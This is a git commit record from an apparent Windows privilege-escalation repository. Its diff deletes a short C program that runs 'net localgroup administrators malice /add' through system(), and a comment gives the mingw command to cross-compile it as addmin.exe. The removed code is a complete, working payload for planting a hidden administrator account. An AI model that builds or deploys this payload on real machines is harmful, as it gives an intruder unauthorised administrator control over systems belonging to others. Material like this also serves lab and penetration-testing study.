0b768ae71dd736e3aa3e7a70186b53cf3db5bbf1
Malice-in-Chains <43681828+Malice-in-Chains@users.noreply.github.com>
2019-07-07 23:02:41 -0500

    Update and rename add-user-admin.c to add-admin.c

--- Windows-Privilege-Escalation/add-user-admin.c
+++
@@ -1,9 +0,0 @@
-  #include <stdlib.h>
-  int main ()
-  {
-    int i;
-    i = system("net localgroup administrators malice /add");
-    return 0;
-   }
-   
-   /* i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o addmin.exe */
